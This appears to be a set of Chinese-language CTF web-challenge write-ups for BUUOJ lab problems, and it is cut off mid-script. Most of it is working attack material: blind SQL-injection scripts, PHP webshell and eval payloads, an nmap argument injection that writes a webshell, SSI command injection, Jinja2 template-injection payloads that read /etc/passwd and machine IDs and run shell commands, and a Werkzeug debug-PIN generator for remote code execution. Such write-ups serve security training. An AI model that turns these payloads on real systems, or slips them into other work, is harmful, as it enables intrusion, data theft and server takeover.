\u0026#34;a:3:{s:1:\u0026#34;a\u0026#34;;s:55:\u0026#34;\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;Z3Vlc3RfaW1nLnBuZw==\u0026#34;;s:3:\u0026#34;exp\u0026#34;;s:40:\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;L2QwZzNfZmxsbGxsbGFn\u0026#34;;i:0;i:1;}\u0026#34;;}\u0026#34; payload\n1 _SESSION[user]=flagflagflagflagflagphp\u0026amp;_SESSION[function]=\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:1:\u0026#34;2\u0026#34;;} [强网杯 2019]高明的黑客 用脚本筛选\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 import os import re import time import threading import requests from tqdm import tqdm thread_ = threading.Semaphore(30) # 设置最大线程数 ,别设置太大，不然还是会崩的 requests.adapters.DEFAULT_RETRIES = 5 #设置重连次数，防止线程数过高，断开连接 session = requests.Session() session.keep_alive = False # 设置连接活跃状态为False buu_url = \u0026#34;http://35a34fe5-7916-4ebf-a7ff-bfd82fe9bd4a.node4.buuoj.cn:81\u0026#34; filePath = r\u0026#34;D:\\Downloads\\src\u0026#34; os.chdir(filePath) files = os.listdir(filePath) flags = [] rrGET = re.compile(r\u0026#34;\\$_GET\\[\\\u0026#39;(\\w+)\\\u0026#39;\\]\u0026#34;) # 匹配get参数 rrPOST = re.compile(r\u0026#34;\\$_POST\\[\\\u0026#39;(\\w+)\\\u0026#39;\\]\u0026#34;) # 匹配post参数 def getflag(file): print(\u0026#34;[+]checking file:%s\u0026#34; % (file)) thread_.acquire() url = buu_url + \u0026#34;/\u0026#34; + file with open(file, encoding=\u0026#39;utf-8\u0026#39;) as f: gets = list(rrGET.findall(f.read())) posts = list(rrPOST.findall(f.read())) for g in gets: print(\u0026#34;[++]checking %s\u0026#34; % (g)) time.sleep(0.02) res = session.get(url + \u0026#34;?%s=%s\u0026#34; % (g, \u0026#34;echo ------\u0026#34;)) if \u0026#34;------\u0026#34; in res.text: flag = \u0026#34;fileName=%s, param=%s\u0026#34; % (file, g) flags.append(flag) for p in posts: print(\u0026#34;[++]checking %s\u0026#34; % (p)) res = session.post(url, data={p:\u0026#34;echo ------\u0026#34;}) if \u0026#34;------\u0026#34; in res.text: flag = \u0026#34;fileName=%s, param=%s\u0026#34; % (file, g) flags.append(flag) thread_.release() if __name__ == \u0026#39;__main__\u0026#39;: start_time = time.time() thread_list = [] for file in tqdm(files): t = threading.Thread(target=getflag, args=(file,)) thread_list.append(t) for t in thread_list: t.start() for t in thread_list: t.join() print(flags) end_time = time.time() print(\u0026#34;[end]程序结束:用时(秒):\u0026#34;+str(end_time-start_time)) 最后参数为\n1 /xk0SzyKwfzw.php?Efa5BVG=cat /flag [网鼎杯 2020 朱雀组]Nmap 题目叫nmap想到之前的一道题online tool用-oG参数写入木马，用单引号加空格绕过\n1 \u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG shell.php \u0026#39; 回显hacker，可能匹配了后缀名php\n1 \u0026#39; \u0026lt;?= @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG shell.phtml \u0026#39; 回显hostmaybedown\n加上ip\n1 127.0.0.1 |\u0026#39; \u0026lt;?= @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG shell.phtml \u0026#39; 上传后蚁剑连接\n解法二用-iL参数读取文件\n1 127.0.0.1 |\u0026#39; -iL /flag -o 1 \u0026#39; 因为注释里面有提示flag在根目录\n这样再访问1就得到flag\n[NPUCTF2020]ReadlezPHP 反序列化，过滤system，用assert查看phpinfo\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php class HelloPhp { public $a=\u0026#39;phpinfo()\u0026#39;; public $b=\u0026#39;assert\u0026#39;; public function __destruct(){ $a = $this-\u0026gt;a; $b = $this-\u0026gt;b; echo $b($a); } } $c = new HelloPhp(); echo serialize($c); 查找flag就有了\n[SWPU2019]Web1 sql注入过滤了or和空格和注释，用/**/绕过\n1 2 3 4 -1\u0026#39;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\u0026#39; 1\u0026#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\u0026#39; 1\u0026#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=\u0026#34;web1\u0026#34;\u0026#39; 1\u0026#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\u0026#39; 无列名注入 如果information_schema被WAF,得到表名之后使用无列名注入技巧获取字段值.\n1 select 1,2,3 union select * from 测试 之后就可以利用数字来对应相应的列,进行查询\n1 select `2` from (select 1,2,3 union select * from 测试) as test 1、列名需要用``包裹起来\n2、使用子查询的时候,即一个查询嵌套在另一个查询中,内层查询的结果可以作为外层查询的条件,内层查询到的结果需要起一个别名(as)\n如果反引号``被过滤,可以使用为字段起别名的方式.\n1 select b from (select 1,2 as b,3 union select * from 测试) as test [极客大挑战 2019]FinalSQL 盲注\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import requests import time url = \u0026#34;http://5045a2b7-44b5-44ee-99d1-9db358afe49c.node5.buuoj.cn:81/search.php?\u0026#34; temp = {\u0026#34;id\u0026#34;: \u0026#34;\u0026#34;} column = \u0026#34;\u0026#34; for i in range(1, 1000): time.sleep(0.06) low = 32 high = 128 mid = (low + high) // 2 while (low \u0026lt; high): # 库名 #temp[\u0026#34;id\u0026#34;] = \u0026#34;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))\u0026gt;%d)^1\u0026#34; % (i, mid) # 表名 #temp[\u0026#34;id\u0026#34;] = \u0026#34;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))\u0026gt;%d)^1\u0026#34; %(i,mid) # 字段名 #temp[\u0026#34;id\u0026#34;] = \u0026#34;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;F1naI1y\u0026#39;)),%d,1))\u0026gt;%d)^1\u0026#34; %(i,mid) # 内容 temp[\u0026#34;id\u0026#34;] = \u0026#34;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))\u0026gt;%d)^1\u0026#34; %(i,mid) r = requests.get(url, params=temp) time.sleep(0.04) print(low, high, mid, \u0026#34;:\u0026#34;) if \u0026#34;Click\u0026#34; in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 if (mid == 32 or mid == 127): break column += chr(mid) print(column) print(\u0026#34;All:\u0026#34;, column) [CISCN 2019 初赛]Love Math 这里黑名单过滤了不少东西，常规的cat/flag都不能使用了，这里有个知识点是php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat/flag’);\n1 ?c=($_GET[a])($_GET[b])\u0026amp;a=system\u0026amp;b=cat /flag 但是这里的_GET和a，b都不是白名单里面的，这里需要替换\n1 ?c=($_GET[pi])($_GET[abs])\u0026amp;pi=system\u0026amp;abs=cat /flag 但是这里的_GET是无法进行直接替换，而且[]也被黑名单过滤了\nhex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。\n但是hex2bin()函数也不是白名单里面的，而且这里的5f 47 45 54也不能直接填入,会被过滤\n这里的hex2bin()函数可以通过base_convert()函数来进行转换\nbase_convert()函数能够在任意进制之间转换数字\n这里的hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin\nhex2bin=base_convert(37907361743,10,36)\n然后里面的5f 47 45 54要用dechex()函数将10进制数转换为16进制的数\ndechex(1598506324)，1598506324转换为16进制就是5f 47 45 54\n1 2 payload /?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})\u0026amp;pi=system\u0026amp;abs=cat /flag [极客大挑战 2019]RCE ME 上传webshell，蚁剑连接,正则用取反绕过\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php error_reporting(0); $a=\u0026#39;assert\u0026#39;; $b=urlencode(~$a); echo $b; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; $c=\u0026#39;(eval($_POST[cmd]))\u0026#39;; $d=urlencode(~$c); echo $d; ?\u0026gt; 两个参数要用（）隔开\n由于命令执行参数被过滤了，用蚁剑插件绕过\n直接/readflag\n[De1CTF 2019]SSRF Me 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 #! /usr/bin/env python # #encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(\u0026#39;latin1\u0026#39;) app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip):\t#是一个简单的赋值函数 self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)):\t#如果没有该文件夹，则创立一个文件夹 os.mkdir(self.sandbox) def Exec(self): result = {} result[\u0026#39;code\u0026#39;] = 500 if (self.checkSign()): if \u0026#34;scan\u0026#34; in self.action: tmpfile = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;w\u0026#39;) #注意w，可以对result.txt文件进行修改 resp = scan(self.param) if (resp == \u0026#34;Connection Timeout\u0026#34;): result[\u0026#39;data\u0026#39;] = resp else: print resp tmpfile.write(resp)\t#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中 tmpfile.close() result[\u0026#39;code\u0026#39;] = 200 if \u0026#34;read\u0026#34; in self.action: f = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;r\u0026#39;)\t#打开方式为只读 result[\u0026#39;code\u0026#39;] = 200 result[\u0026#39;data\u0026#39;] = f.read()\t#读取result.txt中的数据 if result[\u0026#39;code\u0026#39;] == 500: result[\u0026#39;data\u0026#39;] = \u0026#34;Action Error\u0026#34; else: result[\u0026#39;code\u0026#39;] = 500 result[\u0026#39;msg\u0026#39;] = \u0026#34;Sign Error\u0026#34; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False @app.route(\u0026#34;/geneSign\u0026#34;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def geneSign(): param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;)) action = \u0026#34;scan\u0026#34; return getSign(action, param) @app.route(\u0026#39;/De1ta\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;])\t#注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程 def challenge(): action = urllib.unquote(request.cookies.get(\u0026#34;action\u0026#34;))\t#cookie传递action参数，对应不同的处理方式 param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;))\t#传递get方式的参数param sign = urllib.unquote(request.cookies.get(\u0026#34;sign\u0026#34;))\t#cookie传递sign参数sign ip = request.remote_addr\t#获取请求端的ip地址 if(waf(param)):\t#调用waf函数进行过滤 return \u0026#34;No Hacker!!!!\u0026#34; task = Task(action, param, sign, ip) #创建Task类对象 return json.dumps(task.Exec())\t#以json的形式返回到客户端 @app.route(\u0026#39;/\u0026#39;) def index(): return open(\u0026#34;code.txt\u0026#34;,\u0026#34;r\u0026#34;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50]\t#这个可以利用为访问flag.txt。读取然后为下一步将flag.txt文件中的东西放到result.txt中做铺垫 except: return \u0026#34;Connection Timeout\u0026#34; def getSign(action, param):\t#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值 return hashlib.md5(secert_key + param + action).hexdigest() def md5(content):\t#将传入的字符串进行md5加密 return hashlib.md5(content).hexdigest() def waf(param):\t#防火墙的作用是判断开头的几个字母是否是gopher 或者是file 如果是的话，返回true check=param.strip().lower() if check.startswith(\u0026#34;gopher\u0026#34;) or check.startswith(\u0026#34;file\u0026#34;): return True else: return False if __name__ == \u0026#39;__main__\u0026#39;: app.debug = False app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=9999) /geneSign路由下面会调用getsign函数，跟进会有MD5哈希， return hashlib.md5(secert_key + param + action).hexdigest(),我们传入flag.txtread就会被拼接为secert_key+flag.txt+read+scan,然后就满足下面将flag.txt写入result.txt，然后再读取result.txt，/geneSign路由会回显hash,然后我们在/De1ta路由下面的cookie传入符合条件的值，就能读取result.txt\nhash:0ffa43c8b41c61f35e5f10c15ee8a3e6\n[BJDCTF2020]EasySearch 目录扫描扫出index.php.swp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;?php ob_start(); function get_hash(){ $chars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^\u0026amp;*()+-\u0026#39;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); *** if(isset($_POST[\u0026#39;username\u0026#39;]) and $_POST[\u0026#39;username\u0026#39;] != \u0026#39;\u0026#39; ) { $admin = \u0026#39;6d0bc1\u0026#39;; if ( $admin == substr(md5($_POST[\u0026#39;password\u0026#39;]),0,6)) { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[+] Welcome to manage system\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; $file_shtml = \u0026#34;public/\u0026#34;.get_hash().\u0026#34;.shtml\u0026#34;; $shtml = fopen($file_shtml, \u0026#34;w\u0026#34;) or die(\u0026#34;Unable to open file!\u0026#34;); $text = \u0026#39; *** *** \u0026lt;h1\u0026gt;Hello,\u0026#39;.$_POST[\u0026#39;username\u0026#39;].\u0026#39;\u0026lt;/h1\u0026gt; *** ***\u0026#39;; fwrite($shtml,$text); fclose($shtml); *** echo \u0026#34;[!] Header error ...\u0026#34;; } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[!] Failed\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; }else { *** } *** ?\u0026gt; password的md5hash要是6d0bc1,写脚本爆破\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import hashlib import threading string=\u0026#39;0123456789\u0026#39; class BF(threading.Thread): def __init__(self,left,right): threading.Thread.__init__(self) self.left=left self.right=right def run(self): admin=\u0026#39;6d0bc1\u0026#39; for i in range(self.left,self.right): s=hashlib.md5(str(i).encode(\u0026#39;utf8\u0026#39;)).hexdigest() if s[:6]==admin: print(i) threads=[] thread_count=5 for i in range(thread_count): threads.append(BF(i*2000000,(i+1)*2000000)) for t in threads: t.start() t.join() 2020666 2305004 9162671\n登入成功后会在public路由下面写入shtml文件\n接下来就用到\nApache SSI 远程命令执行漏洞（SSI注入漏洞） 当目标服务器开启了SSI与CGI支持，我们就可以上传shtml，利用\u0026lt;!--#exec cmd=\u0026quot;ls /\u0026quot; --\u0026gt;语法来执行命令。\n使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为\u0026quot;服务器端嵌入\u0026quot;或者叫\u0026quot;服务器端包含\u0026quot;，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。\n我们先bp查看信息，找到前下的shtml，回显用户名\n可以在用户名处注入\n1 2 \u0026lt;!--#exec cmd=\u0026#34;ls ../\u0026#34; --\u0026gt; \u0026lt;!--#exec cmd=\u0026#34;cat /flag\u0026#34; --\u0026gt; 这里找到flag_990c66bf85a09c664f0b6741840499b2\n[GYCTF2020]FlaskApp 先用非预期解\n字符串拼接绕过，或者倒序输出绕过\n1 2 3 查看app.py {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;app.py\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 过滤了flag和os等函数和关键词。 1 {{\u0026#39;\u0026#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;__imp\u0026#39;+\u0026#39;ort__\u0026#39;](\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).listdir(\u0026#39;/\u0026#39;)}} 1 2 将字符倒转输出 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;txt.galf_eht_si_siht/\u0026#39;[::-1],\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 1 2 字符串拼接 {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == \u0026#39;catch_warnings\u0026#39; %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if \u0026#39;eva\u0026#39;+\u0026#39;l\u0026#39; in b.keys() %} {{ b[\u0026#39;eva\u0026#39;+\u0026#39;l\u0026#39;](\u0026#39;__impor\u0026#39;+\u0026#39;t__\u0026#39;+\u0026#39;(\u0026#34;o\u0026#39;+\u0026#39;s\u0026#34;)\u0026#39;+\u0026#39;.pope\u0026#39;+\u0026#39;n\u0026#39;+\u0026#39;(\u0026#34;cat /this_is_the_fl\u0026#39;+\u0026#39;ag.txt\u0026#34;).read()\u0026#39;) }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} 预期解\npython的flask模板注入debug模式利用PIN码进行RCE 生成PIN的关键值有如下几个\n1、服务器运行flask所登录的用户名。 通过读取/etc/passwd获得 2、modname 一般不变就是flask.app 3、getattr(app, “name”, app.class.name)。python该值一般为Flask值一般不变 4、flask库下app.py的绝对路径。通过报错信息就会泄露该值。 5、当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address获得 //eth0处为当前使用的网卡 6、最后一个就是机器的id。 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。对于docker机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id\n下面开始操作\n通过随便报错回显app.py位置\n1 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;app.py\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 发现waf\n1 2 **def waf(str): black_list =[\u0026amp;#34;flag\u0026amp;#34;,\u0026amp;#34;os\u0026amp;#34;,\u0026amp;#34;system\u0026amp;#34;,\u0026amp;#34;popen\u0026amp;#34;,\u0026amp;#34;import\u0026amp;#34;,\u0026amp;#34;eval\u0026amp;#34;,\u0026amp;#34;chr\u0026amp;#34;,\u0026amp;#34;request\u0026amp;#34;, \u0026amp;#34;subprocess\u0026amp;#34;,\u0026amp;#34;commands\u0026amp;#34;,\u0026amp;#34;socket\u0026amp;#34;,\u0026amp;#34;hex\u0026amp;#34;,\u0026amp;#34;base64\u0026amp;#34;,\u0026amp;#34;*\u0026amp;#34;,\u0026amp;#34;?\u0026amp;#34;]** 1 2 读取用户名 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/etc/passwd\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} flaskweb\n1 2 当前网络的mac地址的十进制数。 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/sys/class/net/eth0/address\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 4e:4d:bc:b8:a0:2c\n1 将4e4dbcb8a02c转为10进制为86095785664556 1 2 读取机器id {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/proc/self/cgroup\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} docker-513f790d4e2fc09de7be4e6c769883760f1a8090aa089d9bba99b995084759ea.scope\n但是这题是buu的要读linux的machine_id\n1 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/etc/machine-id\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 1408f836b0ca514d796cbf8960e45fa1\n生成pin码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import hashlib from itertools import chain probably_public_bits = [ \u0026#39;flaskweb\u0026#39;# username \u0026#39;flask.app\u0026#39;,# modname \u0026#39;Flask\u0026#39;,# getattr(app, \u0026#39;__name__\u0026#39;, getattr(app.__class__, \u0026#39;__name__\u0026#39;)) \u0026#39;/usr/local/lib/python3.7/site-packages/flask/app.py\u0026#39; # getattr(mod, \u0026#39;__file__\u0026#39;, None), ] private_bits = [ \u0026#39;86095785664556\u0026#39;,# str(uuid.getnode()), /sys/class/net/ens33/address \u0026#39;1408f836b0ca514d796cbf8960e45fa1\u0026#39;# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(\u0026#39;utf-8\u0026#39;) h.update(bit) h.update(b\u0026#39;cookiesalt\u0026#39;) cookie_name = \u0026#39;__wzd\u0026#39; + h.hexdigest()[:20] num = None if num is None: h.update(b\u0026#39;pinsalt\u0026#39;) num = (\u0026#39;%09d\u0026#39; % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \u0026#39;-\u0026#39;.join(num[x:x + group_size].rjust(group_size, \u0026#39;0\u0026#39;) for x in range(0, len(num), group_size)) break else: rv = num print(rv) 238-924-850\n在报错界面查找到有debug界面，输入pin码然后就可以在终端RCE了\n1 2 3 import os os.popen(\u0026#39;ls /\u0026#39;).read() os.popen(\u0026#39;cat /this_is_the_flag.txt\u0026#39;).read() [WUSTCTF2020]颜值成绩查询 布尔盲注\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import requests url= \u0026#39;http://575aff7c-bbec-4a7a-8075-c9dd55f58df3.node5.buuoj.cn:81/\u0026#39; database =\u0026#34;\u0026#34; payload1 = \u0026#34;?stunum=1^(ascii(substr((select(database())),{},1))\u0026gt;{})^1\u0026#34; #库名为ctf payload2 = \u0026#34;?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\u0026#39;ctf\u0026#39;)),{},1))\u0026gt;{})^1\u0026#34;#表名为flag,score payload3 =\u0026#34;?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;flag\u0026#39;)),{},1))\u0026gt;{})^1\u0026#34; #列名为flag,value payload4 = \u0026#34;?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),{},1))\u0026gt;{})^1\u0026#34; # for i in range(1,10000): low = 32 high = 128 mid =(low + high) // 2 while(low \u0026lt; high): # payload = payload1.format(i,mid) #查库名 # payload = payload2.format(i,mid) #查表名 # payload = payload3.format(i,mid) #查列名 payload = payload4.format(i,mid) #查flag new_url = url + payload r = requests.get(new_url) print(new_url) if \u0026#34;Hi admin, your score is: 100\u0026#34; in r.text: low = mid + 1 else: high = mid mid = (low + high) //2 if (mid == 32 or mid == 132): break database +=chr(mid) print(database) print(database) [FBCTF2019]RCEService 提示用json格式，传参是cmd\n我们ls一下\n1 {\u0026#34;cmd\u0026#34;:\u0026#34;ls\u0026#34;} 发现index.php\n但是原来题目有源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php putenv(\u0026#39;PATH=/home/rceservice/jail\u0026#39;); if (isset($_REQUEST[\u0026#39;cmd\u0026#39;])) { $json = $_REQUEST[\u0026#39;cmd\u0026#39;]; if (!is_string($json)) { echo \u0026#39;Hacking attempt detected\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026#39;; } elseif (preg_match(\u0026#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/\u0026#39;, $json)) { echo \u0026#39;Hacking attempt detected\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026#39;; } else { echo \u0026#39;Attempting to run command:\u0026lt;br/\u0026gt;\u0026#39;; $cmd = json_decode($json, true)[\u0026#39;cmd\u0026#39;]; if ($cmd !== NULL) { system($cmd); } else { echo \u0026#39;Invalid input\u0026#39;; } echo \u0026#39;\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026#39;; } } ?\u0026gt; 因为preg_match只能匹配第一行，所以这里可以采用多行绕过。 因为putenv('PATH=/home/rceservice/jail');修改了环境变量，所以只能使用绝对路径使用cat命令，cat命令在/bin文件夹下\n1 2 3 ?cmd={%0A\u0026#34;cmd\u0026#34;:\u0026#34;/usr/bin/find / -name flag*\u0026#34;%0A} ?cmd={%0A\u0026#34;cmd\u0026#34;:\u0026#34;ls /home/rceservice\u0026#34;%0A} ?cmd={%0A\u0026#34;cmd\u0026#34;:\u0026#34;/bin/cat /home/rceservice/flag\u0026#34;%0A} 关于preg_match，有p神曾经讲的PRCE\n1 2 3 4 5 6 7 8 import requests url=\u0026#39;http://d5e835b5-ec7b-41b3-b1f3-8973c7ac6f60.node5.buuoj.cn:81/\u0026#39; data={ \u0026#39;cmd\u0026#39;:\u0026#39;{\u0026#34;cmd\u0026#34;:\u0026#34;/bin/cat /home/rceservice/flag\u0026#34;,\u0026#34;haha\u0026#34;:\u0026#34;\u0026#39;+\u0026#39;a\u0026#39;*1000000+\u0026#39;\u0026#34;}\u0026#39; } r=requests.post(url=url,data=data).text print(r) [SUCTF 2019]Pythonginx 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @app.route(\u0026#39;/getUrl\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def getUrl(): url = request.args.get(\u0026#34;url\u0026#34;) host = parse.urlparse(url).hostname if host == \u0026#39;suctf.cc\u0026#39;: return \u0026#34;我扌 your problem? 111\u0026#34; parts = list(urlsplit(url)) host = parts[1] if host == \u0026#39;suctf.cc\u0026#39;: return \u0026#34;我扌 your problem? 222 \u0026#34; + host newhost = [] for h in host.split(\u0026#39;.\u0026#39;): newhost.append(h.encode(\u0026#39;idna\u0026#39;).decode(\u0026#39;utf-8\u0026#39;)) parts[1] = \u0026#39;.\u0026#39;.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(\u0026#39; \u0026#39;)[0] host = parse.urlparse(finalUrl).hostname if host == \u0026#39;suctf.cc\u0026#39;: return urllib.request.urlopen(finalUrl).read() else: return \u0026#34;我扌 your problem? 333\u0026#34; 从代码上看，我们需要提交一个url，用来读取服务器端任意文件\n简单来说，需要逃脱前两个if，成功进入第三个if。\n而三个if中判断条件都是相同的，不过在此之前的host构造却是不同的，这也是blackhat该议题中想要说明的一点\n当URL 中出现一些特殊字符的时候，输出的结果可能不在预期\n或者用%绕过\n1 U:℆ A:c/u ascii:8454 ，因为℆经过编码解码后就是c/u，这和我们想要的file://suctf.cc/usr/local/nginx/conf/nginx.conf，刚好℆可以替代c/u 接着我们只需要按照getUrl函数写出爆破脚本即可得到我们能够逃逸的构造语句了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from urllib.parse import urlparse,urlunsplit,urlsplit from urllib import parse def get_unicode(): for x in range(65536): uni=chr(x) 